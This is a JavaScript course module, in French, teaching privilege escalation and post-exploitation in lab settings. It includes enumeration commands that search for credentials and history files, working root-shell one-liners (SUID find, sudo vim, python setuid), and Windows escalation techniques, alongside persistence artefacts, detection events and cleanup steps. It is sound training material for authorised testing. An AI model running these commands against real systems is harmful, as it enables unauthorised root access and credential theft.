export default {
  id: 'm6',
  num: 6,
  title: "Élévation de Privilèges & Post-Exploitation",
  short: "PrivEsc",
  icon: "🔺",
  xp: 400,
  duration: 80,
  summary: "Passer d'un accès limité à un contrôle étendu dans un lab : énumération Linux/Windows, SUID, sudoers, services, persistance encadrée et nettoyage des traces.",
  objectives: [
    "Mener une énumération locale structurée sous Linux et Windows",
    "Identifier SUID, capabilities, tâches cron et services mal configurés",
    "Comprendre les mécanismes d'escalade Windows (tokens, services, AlwaysInstallElevated)",
    "Nettoyer les accès résiduels et analyser les logs d'un audit"
  ],
  blocks: [
    {
      t: 'callout', v: 'legal', title: "Périmètre strict",
      x: "Ce module s'applique exclusivement à des machines de lab (Metasploitable, VulnHub, HTB, TryHackMe, VM personnelles). La persistance, le pivot et la couverture de traces ne sont jamais mis en œuvre hors d'un cadre contractuel explicite."
    },
    {
      t: 'p',
      x: "L'élévation de privilèges (<em>privilege escalation</em>) consiste à obtenir plus de droits que ceux accordés initialement : d'un compte applicatif à un compte système, d'un utilisateur standard à un administrateur. La majorité des cas réels ne sont pas des exploits de noyau mais des <strong>mauvaises configurations</strong>."
    },
    { t: 'h', x: "6.1 Énumération Linux : la checklist" },
    {
      t: 'code', lang: 'bash', title: "Commandes d'énumération essentielles",
      x: `# Identité et contexte
id; whoami; uname -a; cat /etc/os-release
sudo -l                       # droits sudo sans mot de passe ?
groups; getent group sudo

# Fichiers SUID / SGID
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Tâches planifiées
cat /etc/crontab; ls -la /etc/cron.*; crontab -l
systemctl list-timers --all

# Services et sockets
ss -tulnp; ps aux --forest
ls -la /etc/systemd/system/ /lib/systemd/system/

# Fichiers accessibles en écriture
find / -writable -type f 2>/dev/null | grep -v -E '^/proc|^/sys'
ls -la /opt /srv /var/www

# Historique, clés, sauvegardes
cat ~/.bash_history; ls -la ~/.ssh
find / -name "*.bak" -o -name "*.old" -o -name "*.zip" 2>/dev/null | head`
    },
    {
      t: 'table',
      head: ['Vecteur', 'Indice', 'Exemple lab'],
      rows: [
        ['SUID', "Binaire exécutable en root", "find → /usr/bin/find avec bit SUID"],
        ['Sudo mal configuré', "NOPASSWD, commande autorisée", "sudo -l → (ALL) NOPASSWD: /usr/bin/vim"],
        ['Capabilities', "cap_setuid, cap_dac_read_search", "getcap → python3 cap_setuid+ep"],
        ['Cron', "Script root modifiable", "/opt/backup.sh en 777"],
        ['PATH hijack', "Binaire relatif dans un script root", "system(\"backup\") sans chemin absolu"],
        ['Service faible', "Unité systemd writable", "/etc/systemd/system/app.service en 664"],
        ['Noyau', "Version vulnérable", "Dirty Pipe, PwnKit — solution de dernier recours"],
        ['Secrets', "Mot de passe en clair", "config.php, .env, historique"]
      ]
    },
    {
      t: 'code', lang: 'bash', title: "SUID : lire GTFOBins",
      x: `# Un binaire SUID root trouvé : /usr/bin/find
ls -la /usr/bin/find          # -rwsr-xr-x root root
# GTFOBins indique : find . -exec /bin/sh -p \\; -quit
/usr/bin/find . -exec /bin/sh -p \\; -quit
id                            # uid=1000(...) euid=0(root)

# Autre classique : sudo vim
sudo vim -c ':!/bin/sh'

# Capability setuid sur python
getcap /usr/bin/python3
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'`
    },
    {
      t: 'callout', v: 'warn', title: "GTFOBins n'est pas magique",
      x: "Un SUID sur <code>find</code> ne donne root que si le binaire est réellement SUID root. Vérifiez toujours les permissions réelles et le contexte (AppArmor, SELinux, no_new_privs). En lab, testez ; en rapport, prouvez."
    },
    { t: 'h', x: "6.2 Windows : tokens et services" },
    {
      t: 'code', lang: 'powershell', title: "Énumération Windows",
      x: `whoami /all
whoami /priv                     # SeImpersonatePrivilege, SeDebugPrivilege...
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
net user; net localgroup administrators

# Services et chemins non quotés
wmic service get name,displayname,pathname,startmode | findstr /i "auto"
Get-Service | Where-Object {$_.StartType -eq "Automatic"}

# Permissions faibles
icacls "C:\\Program Files\\App"
accesschk.exe -uwcqv "Users" *

# Toujours élever l'installation
reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated

# Credentials sauvegardés
cmdkey /list
reg query HKLM /f password /t REG_SZ /s`
    },
    {
      t: 'ul',
      x: [
        "<strong>SeImpersonate / SeAssignPrimaryToken</strong> : escroquerie de jeton (Potato, PrintSpoofer, RogueWinRM) lorsqu'un service tourne avec ces privilèges.",
        "<strong>Unquoted service path</strong> : <code>C:\\Program Files\\My App\\svc.exe</code> sans guillemets permet de placer <code>C:\\Program.exe</code>.",
        "<strong>Permissions faibles</strong> sur un service ou son répertoire : remplacer le binaire et redémarrer.",
        "<strong>AlwaysInstallElevated</strong> : un MSI s'installe avec les droits SYSTEM.",
        "<strong>SeDebugPrivilege</strong> : injection dans un processus privilégié (lab uniquement)."
      ]
    },
    { t: 'h', x: "6.3 Persistance, nettoyage et détection" },
    {
      t: 'p',
      x: "En Red Team autorisée, la <strong>persistance</strong> sert à démontrer qu'un attaquant pourrait revenir après un redémarrage. Elle doit être <strong>documentée, limitée dans le temps et supprimée</strong> en fin de mission. En Blue Team, on cherche précisément ces artefacts."
    },
    {
      t: 'table',
      head: ['Artefact (lab)', 'Où le trouver', 'Détection Blue Team'],
      rows: [
        ['Clé SSH ajoutée', "~/.ssh/authorized_keys", "Comparaison avec la baseline, mtime anormal"],
        ['Cron ajouté', "/etc/cron.d, crontab", "Surveillance des modifications, auditd"],
        ['Service systemd', "/etc/systemd/system/*.service", "Fichiers récents, ExecStart suspect"],
        ['Utilisateur créé', "/etc/passwd, /etc/shadow", "Logs 4720/4722 (Windows), lastlog"],
        ['Tâche planifiée Windows', "schtasks /query", "Event ID 4698, 106"],
        ['Web shell', "répertoire web", "Fichiers nouveaux, requêtes POST anormales"],
        ['Compte de service', "AD / local", "Event 4728/4732 (ajout de groupe)"]
      ]
    },
    {
      t: 'code', lang: 'bash', title: "Analyse de logs et nettoyage contrôlé",
      x: `# Linux : tentatives et succès
grep -Ei "failed password|accepted password|sudo:" /var/log/auth.log
last -ai | head -20
journalctl --since "2026-11-03" --until "2026-11-08" | grep -i "session opened"

# Rechercher des fichiers modifiés pendant la fenêtre d'audit
find /etc /opt /var/www -newermt "2026-11-03 08:00" ! -newermt "2026-11-07 18:00" -ls

# Windows : connexions et créations de processus
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624,4625,4672,4688} |
  Select-Object TimeCreated, Id, Message -First 50

# Nettoyage (lab) : supprimer UNIQUEMENT les artefacts créés,
# après capture des preuves et validation du client
rm -f /etc/cron.d/audit-test
systemctl daemon-reload
userdel audit-test`
    },
    {
      t: 'callout', v: 'info', title: "La preuve avant le nettoyage",
      x: "Exportez les logs, hash ez les fichiers, capturez les horodatages, puis seulement supprimez. Un artefact supprimé sans preuve rend le rapport invérifiable. En mission réelle, le nettoyage est planifié avec le client et consigné."
    },
    { t: 'h', x: "6.4 Atelier : trouver le bon chemin" },
    {
      t: 'p',
      x: "Vous êtes <code>www-data</code> sur une VM de lab. Analysez les sorties d'énumération et choisissez, à chaque étape, l'action qui mène réellement à root."
    },
    { t: 'lab', id: 'privesc' }
  ],
  quiz: 'q6'
};
